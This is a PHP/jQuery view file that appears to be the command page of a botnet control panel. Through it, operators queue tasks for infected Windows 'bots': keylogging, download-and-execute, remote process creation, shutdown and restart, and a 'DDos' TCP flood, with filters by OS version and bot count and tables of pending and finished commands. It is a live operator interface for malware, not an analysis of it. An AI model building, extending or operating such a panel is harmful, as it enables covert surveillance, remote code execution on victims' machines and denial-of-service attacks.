<?php
/**
 * Created by PhpStorm.
 * User: Ben
 * Date: 1/20/2016
 * Time: 11:26 PM.
 */
//goat::$app->registerJs($inlineJS);
$records_per_page = 3;
?>
<script>
$(function() {

    $(".show-tooltip").click(function(){
        $("#myTooltip").tooltip('show');
    });

    function isUrlValid(url) {
        return /^(https?|s?ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(url);
    }

    var $contextMenu = $("#contextMenu");

    $("body").on("contextmenu", ".pending-table tr", function(e) {
        var offset = $(this).offset();
        $contextMenu.css({
            display: "block",
            left:e.pageX - offset.left,
            top: e.pageY
        });
        return false;
    });

    $contextMenu.on("click", "a", function() {
        $contextMenu.hide();
    });

    $(".cancel_task").click(function(){

        var data = '';
        $(".pending-table tbody tr").each(function() {
            if ($(this).hasClass("highlight"))
            {
                data += $(this).children(":first").text() + ',';
            }
        });
        $.ajax({
            url: "tasks/cancelCommand",
            type: "POST",
            data: {"commands" : data},
            success: function(response) {
                location.reload();
            }});
    });
    $("tr").click(function(e) {
        {
            if($(this).hasClass('highlight'))
            {
                $(this).removeClass('highlight');
                return;
            }
            $(this).addClass('highlight').siblings().removeClass('highlight');

        }
    });

    //default
    var data = <?php echo $helper->Keylog(); ?>;
    $(".task-data").html(data);

    $(".tasks").change(function(){
        switch(parseInt($(this).val())) //should be selected value no?
        {
            case 2:
            {
                var data = <?php echo $helper->VisitUrl(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 3:
            {
                var data = <?php echo $helper->Shutdown(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 4:
            {
                var data = <?php echo $helper->Restart(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 5:
            {
                var data = <?php echo $helper->MessageBox(); ?>;
                $(".task-data").html(data);
                break;

            }
            case 6:
            {
                var data = <?php echo $helper->Keylog(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 8:
            {
                var data = <?php echo $helper->downloadExecute(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 9:
            {
                var data = <?php echo $helper->createRemoteProcess(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 10:
            {
                var data = <?php echo $helper->tcpFlood(); ?>;
                $(".task-data").html(data);
                break;
            }
            case 11:
            {
                var data = <?php echo $helper->downloadExecute(); ?>;
                $(".task-data").html(data);
                break;
            }
            default :
                $(".task-data").html('');
                break;
        }
        $("[data-toggle='tooltip']").tooltip();
    });
    $("#create_command").click(function(){
        //validate url
        if($(".url_check").length > 0)
        {
            if(!isUrlValid($(".url_check").val()))
            {
                $(".container").prepend('<div class="alert alert-danger" role="alert" style="margin-top: 1em;"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>Invalid url format.</div>');
                return false;
            }
        }
        //switch to createProcSTD
        if($(".std_on").length > 0 && $(".std_on").is(':checked'))
        {
            $('#command').find(":selected").val("7");
        }
        var data = {};
        $("*[name='params[]']").each(function(index, value){
            data['params['+index+']'] = $(value).val();
        });
        data['command'] = $(".tasks option:selected").val();
        if($("#filters").is(':checked'))
        {
            data['_filters'] = 'on';
            data['os_version'] = $("#os_version").val();
            data['max_client'] = $("#max_client").val();
        }

        $.ajax({
            url: "tasks/createcommand",
            type: "POST",
            data: data,
            success: function(response) {
                //console.log(response);
                location.reload();
            }
        });
    });
    $("body").on("click", ".switch-logs-on", function(){
        $(".key_log").val("start");
    });
    $("body").on("click", ".switch-logs-off", function(){
        $(".key_log").val("stop");
    });
});
</script>

<div class="alpha-container container-fluid">
    <?php echo $header; ?>
    <div class="container-fluid col-lg-10" style="margin-right: 0; background-color: white; margin-top: 1em;">
        <?php
        $result = goat::$app->getFlash('_result');
        echo (! empty($result)) ? $result : null;
        ?>
            <div class="row">
                <div class="group-box" style="height: 22em;">
                    <h4>Create Commands</h4>
                    <select id="command" name="command" class="form-control tasks">
                        <optgroup label="Logs">
                            <option value="6">Keylogger</option>
                        </optgroup>
                        <optgroup label="Download">
                            <option value="8">Download & Execute</option>
                            <option value="11">Update</option>
                        </optgroup>
                        <optgroup label="Remote">
                            <option value="3">Shutdown</option>
                            <option value="4">Restart</option>
                            <option value="9">Create Remote Process</option>
                            <option value="5">Display Message Box</option>
                            <option value="2">Check Website Status</option>
                            <!--<option value="10">Open Website In Browser</option>-->
                            <!--<option value="11">Take screenshot</option>-->
                        </optgroup>
                        <optgroup label="DDos">
                            <option value="10">TCP Flood</option>
                        </optgroup>
                    </select>
                    <br>
                    <a href="#" id="create_command"  class="btn btn-default">Create Command</a> <!-- onclick="$('.create_command_form').submit();" -->
                    <br><br>
                    <div class="panel-group">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h4 class="panel-title">
                                    <a data-toggle="collapse" href="#collapse1">Filters</a>
                                </h4>
                            </div>
                            <div id="collapse1" class="panel-collapse collapse">
                                <div class="panel-body">
                                    <div class="col-lg-8">
                                        <div class="input-group">
                                            <input type="text" id="os_version" class="form-control" aria-label="...">
                                            <div class="input-group-btn">
                                                <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">OS Version <span class="caret"></span></button>
                                                <ul class="dropdown-menu dropdown-menu-right">
                                                    <li onclick='$("#os_version").val("All Operating Systems")'><a href="#">All Operating Systems</a></li>
                                                    <li onclick='$("#os_version").val("Windows XP")'><a href="#">Windows XP</a></li>
                                                    <li onclick='$("#os_version").val("Windows Vista")'><a href="#">Windows Vista</a></li>
                                                    <li onclick='$("#os_version").val("Windows 8")'><a href="#">Windows 8</a></li>
                                                    <li onclick='$("#os_version").val("Windows 8.1")'><a href="#">Windows 8.1</a></li>
                                                    <li onclick='$("#os_version").val("Windows 10")'><a href="#">Windows 10</a></li>
                                                </ul>
                                            </div><!-- /btn-group -->
                                        </div><!-- /input-group -->
                                    </div>
                                    <div class="col-lg-2">
                                        <input class="form-control" id="max_client" name="max_client" type="text" placeholder="Max bots.." value="9999">
                                    </div>
                                    <div class="col-lg-2">
                                        <label style="font-weight: normal;"><input id="filters" type="checkbox" name="filters_on" style="margin-top: 14px;"> Enabled</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <br>
            <div class="row">
                <div class="group-box task-data">
                    <?php
                    if (! empty($log)) {
                        echo '<textarea id="log" cols="90" rows="4" placeholder="Logs will be seen here..."></textarea>';
                    }
                    ?>
                </div>
            </div>

            <div class="table-responsive">
                <ul class="nav nav-tabs">
                    <li class="active"><a data-toggle="tab" href="#home">Pending Commands</a></li>
                    <li><a data-toggle="tab" href="#menu1">Terminated Commands</a></li>
                </ul>
                <div class="tab-content">
                    <div id="home" class="tab-pane fade in active">
                        <h1>Pending Commands</h1>
                        <table class="table table-striped table-hover table-condensed  pending-table" style="font-size: small">
                            <thead>
                            <tr>
                                <th class="nowrap">Affected Bots</th>
                                <th class="nowrap">Current Scheduled Tasks</th>
                                <th class="nowrap">Command Arguments</th>
                            </tr>
                            </thead>
                            <tbody>
                            <?php
                            $paginate->tableName = 'p_page_no';
                            $newquery = $paginate->paging($pending, $records_per_page);
                            $paginate->dataview($newquery);
                            ?>
                            </tbody>
                        </table>
                        <div class="col-lg-9 col-md-9 col-sm-12" style="bottom: 0;">
                            <?php echo $paginate->paginglink($pending, $records_per_page); ?>
                        </div>
                    </div>
                    <div id="menu1" class="tab-pane fade">
                        <h1>Terminated Commands</h1>
                        <table class="table table-striped table-hover table-condensed" style="font-size: small">
                            <thead>
                            <tr>
                                <th class="nowrap">Affected Bots</th>
                                <th class="nowrap">Current Scheduled Tasks</th>
                                <th class="nowrap">Command Arguments</th>
                                <th class="nowrap">Command Results</th>
                            </tr>
                            </thead>
                            <tbody>
                            <?php
                            $paginate->tableName = 't_page_no';
                            $newquery = $paginate->paging($terminated, $records_per_page);
                            $paginate->dataview($newquery);
                            ?>
                            </tbody>
                        </table>
                        <div class="col-lg-9 col-md-9 col-sm-12" style="bottom: 0;">
                            <?php echo $paginate->paginglink($terminated, $records_per_page); ?>
                        </div>
                    </div>
                </div>
            </div>
            <div class="table-responsive">
                <div id="contextMenu" class="dropdown clearfix" style="display: none; position: absolute;">
                    <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu" style="display:block;position:static;margin-bottom:5px;">
                        <li><a tabindex="-1" href="">Cancel</a></li>
                        <li><a tabindex="-1" href="#" class="cancel_task">Cancel Command</a></li>
                    </ul>
                </div>
                <?php $_bots = goat::$app->getFlash('_bots', true); ?>
                <table class="table table-striped table-hover table-condensed" style="font-size: small">
                    <thead>
                    <tr>
                        <div class="panel panel-default">
                            <div class="panel-heading" href="#" data-toggle="collapse" data-target="#botselected" aria-expanded="false" aria-controls="botselected" style="line-height: 1.5em;">Selected Bots&nbsp&nbsp<span class="badge"><?php echo count($_bots); ?></span></div>
                        </div>
                    </tr>
                    </thead>

                    <?php
                    if (isset($_bots) && is_array($_bots) && ! empty($_bots[0])) {
                        echo '<tbody class="collapse" id="botselected">';
                        foreach ($_bots as $bots) {
                            //echo "<input type='hidden' name='bots[]' value='". $bots ."' />";
                            echo '<tr><td>'.$bots.'</td></tr>';
                        }
                        echo '</tbody>';
                    }
                    ?>
                </table>
            </div>
    </div>
</div>
